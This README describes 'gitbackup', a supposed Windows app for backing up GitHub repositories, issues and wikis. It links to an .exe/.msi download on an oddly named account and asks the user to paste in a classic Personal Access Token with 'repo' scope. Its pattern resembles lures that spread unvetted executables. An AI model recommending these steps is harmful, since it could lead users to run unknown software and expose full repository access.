# 💾 gitbackup - Keep your GitHub data safe now

<a href="https://github.com/Augustan-britishwestafrica489/gitbackup/releases"><img src="https://img.shields.io/badge/Download-Gitbackup-blue.svg" alt="Download Gitbackup"></a>

## 📋 Program Overview

This tool saves a copy of your GitHub account data to your computer. It turns an internal script into a user-friendly desktop application. You store your code, issues, and wiki pages on your local machine. This provides a backup in case you lose internet access or GitHub services go down. The application handles the transfer process through a simple interface. You do not need to write code to use it.

## ⚙️ System Requirements

This application runs on Windows 10 and Windows 11. Your computer requires at least 4GB of RAM to manage large repositories. You need a stable internet connection for the initial download of your files. Ensure you have 500MB of free disk space to store the local database. The program works with any standard GitHub account. You do not need special administrator rights to install the software.

## ⬇️ Installation Steps

1. Visit the [official releases page](https://github.com/Augustan-britishwestafrica489/gitbackup/releases) to download the setup file.
2. Select the file ending in `.msi` or `.exe` for Windows.
3. Open the file once it finishes saving to your computer.
4. Follow the prompts on the screen to finish the setup process.
5. Launch the application from your Start menu or desktop shortcut.

## 🔑 Preparing Your Account

The application needs permission to see your GitHub data. You must create a Personal Access Token on the GitHub website to allow this connection.

1. Log in to your GitHub account using a web browser.
2. Go to your account Settings.
3. Find the Developer settings menu at the bottom of the left sidebar.
4. Select Personal access tokens and choose Tokens (classic).
5. Click the button to generate a new token.
6. Give your token a name like "GitBackup".
7. Select the "repo" checkbox to allow the tool to read your code.
8. Click the Generate button at the bottom of the page.
9. Copy your new token number immediately. You cannot see it again once you leave the page.

## 🚀 Running Your First Backup

1. Open the gitbackup application on your desktop.
2. Paste your Personal Access Token into the box labeled "Access Token".
3. Enter your GitHub username in the field provided.
4. Select a folder on your computer where you want to store the files. Click "Browse" to pick a location on your hard drive.
5. Click the "Start Backup" button at the bottom of the window.
6. Watch the progress bar as the application copies your data.
7. Wait for the green "Success" message to appear.
8. Check your local folder to see your files stored securely on your machine.

## 🛠️ Application Features

The software includes several tools to manage your data:

- Full repository cloning: The app copies every branch and commit history to your local drive.
- Incremental updates: Future backups only download the new changes you made since your last session. Use this to save time and bandwidth.
- GitHub Issues sync: All issue discussions save to your computer in a readable format.
- Wiki snapshots: Your repository documentation saves as individual files.
- Error logs: If a backup fails, the app records the reason in a text file. You can view this file to see what caused the issue.

## 🔍 Troubleshooting Issues

Common problems have simple fixes.

- Invalid Token: If the app gives an error, verify your token has the "repo" scope enabled. Regenerate a new token if the old one expired.
- Internet Connection: If the progress bar stays at zero, check your connection. Restart your router if the connection drops.
- Permission Denial: Ensure you have permission to write files to the chosen folder. Try selecting a folder in your Documents directory instead of the system drive.
- Application Hang: If the window stops responding, close the application completely. Wait thirty seconds, then restart it. The app resumes from the last completed file.

## 🛡️ Data Safety

Your token and data remain on your local machine. This application does not send your data to third-party servers. Your backup stays within your control on your hard drive. You decide who has access to the local folder where the backup lives. You can move your backup folder to an external hard drive or a secure cloud service at any time for extra safety.

## 📈 Tips for Best Results

Run the backup once a week to keep your local data current. If you work on many large projects, keep an eye on your disk space. You can always delete old local backups if you need more room on your computer. Use a dedicated drive for long-term storage of these backups. Organizing your backup folders by date helps you navigate your history easier. Do not change the filenames inside the backup folder, or the application might not recognize the files during the next update.